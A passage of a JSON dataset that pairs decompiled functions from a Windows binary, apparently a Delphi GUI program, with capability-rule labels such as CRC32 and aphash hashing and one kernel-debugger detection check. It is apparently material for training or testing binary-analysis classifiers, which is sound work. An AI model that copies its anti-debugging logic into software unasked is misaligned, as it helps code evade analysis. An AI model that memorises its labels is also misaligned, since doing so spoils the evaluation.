        "decompiled_code": "\nvoid __fastcall fcn.004369c4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.0040484c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x436c5c;\n        fcn.0040484c();\n        fcn.00420044();\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00437b58": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00437b58(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint pwszKLID;\n    uint var_ch;\n    uint hLibModule;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x437c8b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    pwszKLID._0_1_ = 0;\n    puStack56 = &fcn.00437b58::pwszKLID;\n    puStack60 = 0x437b85;\n    sub.user32.dll_GetKeyboardLayoutNameA();\n    puStack60 = 0x437b91;\n    var_ch = fcn.00421670();\n    uStack64 = 0x437c61;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x437baf;\n    puStack60 = &stack0xfffffffc;\n    fcn.0042174c();\n    puStack72 = 0x437bbf;\n    fcn.004057a0();\n    puStack72 = 0x437bcf;\n    fcn.00405864();\n    puStack72 = 0x437bda;\n    fcn.004219b4();\n    puStack72 = 0x437bea;\n    fcn.00422014();\n    puStack72 = 0x437bf7;\n    uVar1 = fcn.0040fa18();\n    uStack76 = 0x437c44;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    hLibModule = uVar1;\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1, 0x437ce8);\n    iVar3 = (*pcVar2)();\n    *0x4934ec = (*(iVar3 + 0x28) & 1) == 1;\n    *in_FS_OFFSET = uVar1;\n    uStack80 = 0x437c4b;\n    sub.kernel32.dll_FreeLibrary_1(hLibModule);\n    return;\n}\n",
        "token_count": 615
    },
    "004380a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004380a4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.004386ac(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.0040a8a0();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "00439148": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439148(uint arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x49595c < 5) && ((**0x49595c != 4 || (**0x495b8c < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.0040484c();\n    cVar2 = fcn.004047dc();\n    if (((arg_8h & 1) == 0) || ((cVar2 != '\\0' && ((cVar2 == '\\0' || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.00424f64();\n            fcn.004246a8();\n        }\n        else {\n            fcn.00424f64();\n            fcn.004246a8();\n        }\n    }\n    else {\n        fcn.00424f64();\n        fcn.004246a8();\n    }\n    (**(*in_EAX + 0x30))(cVar2, arg_8h);\n    return;\n}\n",
        "token_count": 290
    },
    "0043bb94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.0043bb94(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43bbe8;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = *0x43bbe8 | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "0043ce9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ce9c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x250) + 0x1e) = 1;\n            *(*(in_EAX + 0x254) + 0x1e) = 1;\n        }\n        fcn.0043c5b8();\n        fcn.0043c5b8();\n        if (*(in_EAX + 600) == '\\0') {\n            if (*(*(in_EAX + 0x250) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x250) + 0x10), param_2, param_1);\n                fcn.0043c708();\n            }\n            if (*(*(in_EAX + 0x254) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x254) + 0x10), param_2, param_1);\n                fcn.0043c708();\n            }\n        }\n    }\n    *(*(in_EAX + 0x250) + 0x1e) = 0;\n    *(*(in_EAX + 0x254) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 348
    },
    "0043e3a8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e3a8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x358) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.0043fd90();\n        }\n        fcn.00450750();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 2;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00440a6c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440a6c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x440b1c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x268)) goto code_r0x00440b06;\n    puVar1 = &stack0xfffffffc;\n    if ((param_2 == 0) || (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0x1c) & 0x10) != 0)) goto code_r0x00440adf;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x00440abe:\n        puStack24 = puVar1;\n        fcn.00407550();\n        fcn.0040db04();\n        fcn.00404ec4();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.0043bce8();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x00440abe;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.0040484c();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x00440abe;\n        }\n    }\ncode_r0x00440adf:\n    puStack24 = puVar1;\n    *(in_EAX + 0x268) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x276) != '\\0') {\n            fcn.00440e40();\n        }\n        fcn.0040484c();\n    }\ncode_r0x00440b06:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x440b23;\n    uStack28 = 0x440b1b;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 565
    },
    "004414f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004414f8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.00458594(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x271) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x270) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x270) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "0044354c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044354c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044fec0();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff | param_2 << 0x10;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043fb7c();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00443588": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443588(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044fef4();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff0000 | param_2 & 0xffff;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043fb7c();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00443630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00443679)\n// WARNING: Removing unreachable block (ram,0x00443699)\n// WARNING: Removing unreachable block (ram,0x004436a2)\n// WARNING: Removing unreachable block (ram,0x004436a7)\n// WARNING: Removing unreachable block (ram,0x004436b4)\n// WARNING: Removing unreachable block (ram,0x004436b9)\n// WARNING: Removing unreachable block (ram,0x004436c6)\n\nvoid fcn.00443630(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x443710;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.00456f48();\n    if (iVar1 == 1) {\n        fcn.004507a0();\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.004507b0();\n        fcn.00450860();\n    }\n    fcn.00456dac();\n    fcn.0044fbb4();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.0043e3a8();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x443717;\n    uStack32 = 0x44370f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 391
    },
    "00443ad0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00443ad0(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint auStack40 [7];\n    uint8_t uStack12;\n    \n    auStack40[0] = 0x28;\n    uVar1 = (***0x49594c)(*(in_EAX + 4), auStack40);\n    return uVar1 & 0xffffff00 | (uStack12 & 1) != 0;\n}\n",
        "token_count": 109
    },
    "0044f928": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f928(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x61)) {\n        cVar1 = *(in_EAX + 0x61);\n        *(in_EAX + 0x61) = param_2;\n        if ((*(in_EAX + 7) & 1) == 0) {\n            if (((*0x44f9c4 == cVar1) || (*0x44f9c4 != *(in_EAX + 0x61))) ||\n               ((in_EAX[0x60] == in_EAX[0x10] &&\n                (((in_EAX[0x61] == in_EAX[0x11] && (in_EAX[0x62] == in_EAX[0x12])) && (in_EAX[99] == in_EAX[0x13]))))))\n            {\n                fcn.0044fd3c();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0044f9c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f9c8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.0040484c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x452ea8;\n        fcn.0040484c();\n        fcn.00420044();\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0044fbb4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fbb4(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0044f928();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x88))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else if ((cVar1 == '\\0') || (param_2 != '\\0')) {\n                fcn.0040484c();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 349
    },
    "0044fc9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fc9c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.0045252c();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.00450c88();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.0044fd3c();\n        fcn.004533c8();\n        (**(*in_EAX + 0x80))();\n        fcn.00451ae8(0);\n        (**(*in_EAX + 0x5c))();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "0044fd3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044fd3c(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((*(in_EAX + 0x164) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        (**(**(in_EAX + 0x78) + 0x10))(iVar2 + iVar4);\n        (**(**(in_EAX + 0x78) + 0x10))();\n        fcn.00418428();\n        *(in_EAX + 0x16d) = uStack20;\n        *(in_EAX + 0x171) = uStack16;\n        if (*0x44febc == uVar1) {\n            *(in_EAX + 0x175) = 0;\n            *(in_EAX + 0x179) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x165) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 1) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x169) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 2) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            if (*(in_EAX + 0x30) != NULL) {\n                (**(**(in_EAX + 0x30) + 0xd0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 848
    },
    "00450118": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450118(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 1;\n    }\n    *(in_EAX + 0x160) = param_2;\n    return;\n}\n",
        "token_count": 90
    },
    "0045012c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045012c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 0;\n    }\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 73
    },
    "00450438": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450438(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar2 = *0x4505ec;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar2 = *(in_EAX + 0x23);\n        }\n        if ((uVar2 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar2 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar2 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar2 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar3 = (uVar2 & 8) == 0;\n        if ((bVar3) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar3) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        fcn.004502ec();\n        (**(*in_EAX + 0x88))(iStack32, in_stack_ffffffdc);\n        if (*0x4505f4 != (uVar2 & *0x4505f0)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x175), param_2, iStack32);\n            *(in_EAX + 0x175) = uVar1;\n        }\n        if (*0x4505f4 != (uVar2 & *0x4505f8)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x179), param_2, iStack32);\n            *(in_EAX + 0x179) = uVar1;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar2 & 0x10) != 0)) {\n            uVar1 = fcn.004249ec(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar1);\n            fcn.00424a08();\n        }\n    }\n    *(in_EAX + 0x23) = *0x4505f4;\n    return;\n}\n",
        "token_count": 821
    },
    "00450618": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450618(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4506ae;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.00450830();\n        fcn.00405974();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004047dc();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x0045067a;\n            }\n            bVar2 = true;\n            goto code_r0x00450680;\n        }\n    }\ncode_r0x0045067a:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x00450680:\n    fcn.004204e0();\n    if (bVar2) {\n        fcn.00450860();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4506b5;\n    uStack32 = 0x4506ad;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 459
    },
    "00450aa8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450aa8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00419910();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1cc) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.004197a8();\n                fcn.00419930();\n                fcn.00450c88();\n                if ((*(in_EAX + 0x1c) & 1) == 0) {\n                    iVar2 = fcn.0043bd3c();\n                    if ((*(iVar2 + 0x54) & 4) != 0) {\n                        fcn.0040484c();\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "00450f6c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450f6c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    cVar1 = fcn.0045d540();\n    if (cVar1 != '\\0') {\n        fcn.0045d600();\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x8f) != '\\x01')) {\n        fcn.0040dbc0();\n        fcn.00404ec4();\n    }\n    fcn.00451b1c();\n    if ((*0x49ac80 == 0) || (*0x49ac80 == -1)) {\n        *0x49ac80 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&iStack32);\n            fcn.00450370();\n            iStack32 = iStack20;\n            uStack28 = uStack24 & 0xffff | iStack20 << 0x10;\n            fcn.00451ae8(uStack28);\n        }\n        if (*0x49ac80 != -1) {\n            fcn.0044e800();\n        }\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "004528f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004528f0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x45299c == (*0x452998 & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x25] 